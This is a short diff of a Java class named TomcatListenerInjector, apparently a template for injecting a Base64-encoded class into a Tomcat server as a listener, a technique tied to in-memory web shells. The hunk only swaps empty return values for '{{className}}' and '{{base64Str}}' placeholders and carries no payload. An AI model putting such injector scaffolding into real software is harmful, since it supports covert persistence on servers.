@@ -22,11 +22,11 @@ import java.util.zip.GZIPInputStream;
 public class TomcatListenerInjector {
 
     public String getClassName() {
-        return "";
+        return "{{className}}";
     }
 
     public String getBase64String() {
-        return "";
+        return "{{base64Str}}";
     }
 
     static {
